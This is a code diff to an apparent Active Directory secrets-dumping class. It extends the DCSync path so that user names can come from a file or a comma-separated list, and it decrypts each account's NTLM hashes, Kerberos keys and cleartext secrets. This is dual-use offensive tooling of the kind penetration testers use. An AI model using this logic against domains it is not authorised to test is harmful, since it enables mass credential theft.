@@ -2543,41 +2543,49 @@ class NTDSHashes:
                     # That's because we don't specify the domain for the user (and there might be duplicates)
                     # Always remember that if you specify a domain, you should specify the NetBIOS domain name,
                     # not the FQDN. Just for this time. It's confusing I know, but that's how this API works.
-                    if self.__justUser.find('\\') >=0 or self.__justUser.find('/') >= 0:
-                        self.__justUser = self.__justUser.replace('/','\\')
-                        formatOffered = drsuapi.DS_NAME_FORMAT.DS_NT4_ACCOUNT_NAME
+                    if os.path.isfile(self.__justUser):
+                        with open(self.__justUser) as fi:
+                            usernames = [line.strip() for line in fi]
                     else:
-                        formatOffered = drsuapi.DS_NT4_ACCOUNT_NAME_SANS_DOMAIN
+                        usernames = [x.strip() for x in self.__justUser.split(',')]
+                    for username in usernames:
+                        self.__justUser = username
+                        if self.__justUser.find('\\') >=0 or self.__justUser.find('/') >= 0:
+                            self.__justUser = self.__justUser.replace('/','\\')
+                            formatOffered = drsuapi.DS_NAME_FORMAT.DS_NT4_ACCOUNT_NAME
+                        else:
+                            formatOffered = drsuapi.DS_NT4_ACCOUNT_NAME_SANS_DOMAIN
 
-                    crackedName = self.__remoteOps.DRSCrackNames(formatOffered,
-                                                                 drsuapi.DS_NAME_FORMAT.DS_UNIQUE_ID_NAME,
-                                                                 name=self.__justUser)
+                        crackedName = self.__remoteOps.DRSCrackNames(formatOffered,
+                                                                     drsuapi.DS_NAME_FORMAT.DS_UNIQUE_ID_NAME,
+                                                                     name=self.__justUser)
 
-                    if crackedName['pmsgOut']['V1']['pResult']['cItems'] == 1:
-                        if crackedName['pmsgOut']['V1']['pResult']['rItems'][0]['status'] != 0:
-                            raise Exception("%s: %s" % system_errors.ERROR_MESSAGES[
-                                0x2114 + crackedName['pmsgOut']['V1']['pResult']['rItems'][0]['status']])
+                        if crackedName['pmsgOut']['V1']['pResult']['cItems'] == 1:
+                            if crackedName['pmsgOut']['V1']['pResult']['rItems'][0]['status'] != 0:
+                                LOG.error('DRSCrackNames returned error for user %s, skipping' % self.__justUser)
+                                LOG.warning('Check username or filename.')
+                                continue
 
-                        userRecord = self.__remoteOps.DRSGetNCChanges(crackedName['pmsgOut']['V1']['pResult']['rItems'][0]['pName'][:-1])
-                        #userRecord.dump()
-                        replyVersion = 'V%d' % userRecord['pdwOutVersion']
-                        if userRecord['pmsgOut'][replyVersion]['cNumObjects'] == 0:
-                            raise Exception('DRSGetNCChanges didn\'t return any object!')
-                    else:
-                        LOG.warning('DRSCrackNames returned %d items for user %s, skipping' % (
-                        crackedName['pmsgOut']['V1']['pResult']['cItems'], self.__justUser))
-                    try:
-                        self.__decryptHash(userRecord,
-                                           userRecord['pmsgOut'][replyVersion]['PrefixTableSrc']['pPrefixEntry'],
-                                           hashesOutputFile)
-                        if self.__justNTLM is False:
-                            self.__decryptSupplementalInfo(userRecord, userRecord['pmsgOut'][replyVersion]['PrefixTableSrc'][
-                                'pPrefixEntry'], keysOutputFile, clearTextOutputFile)
+                            userRecord = self.__remoteOps.DRSGetNCChanges(crackedName['pmsgOut']['V1']['pResult']['rItems'][0]['pName'][:-1])
+                            #userRecord.dump()
+                            replyVersion = 'V%d' % userRecord['pdwOutVersion']
+                            if userRecord['pmsgOut'][replyVersion]['cNumObjects'] == 0:
+                                raise Exception('DRSGetNCChanges didn\'t return any object!')
+                        else:
+                            LOG.warning('DRSCrackNames returned %d items for user %s, skipping' % (
+                            crackedName['pmsgOut']['V1']['pResult']['cItems'], self.__justUser))
+                        try:
+                            self.__decryptHash(userRecord,
+                                               userRecord['pmsgOut'][replyVersion]['PrefixTableSrc']['pPrefixEntry'],
+                                               hashesOutputFile)
+                            if self.__justNTLM is False:
+                                self.__decryptSupplementalInfo(userRecord, userRecord['pmsgOut'][replyVersion]['PrefixTableSrc'][
+                                    'pPrefixEntry'], keysOutputFile, clearTextOutputFile)
 
-                    except Exception as e:
-                        LOG.error("Error while processing user!")
-                        LOG.debug("Exception", exc_info=True)
-                        LOG.error(str(e))
+                        except Exception as e:
+                            LOG.error("Error while processing user!")
+                            LOG.debug("Exception", exc_info=True)
+                            LOG.error(str(e))
                 else:
                     while status == STATUS_MORE_ENTRIES:
                         resp = self.__remoteOps.getDomainUsers(enumerationContext)
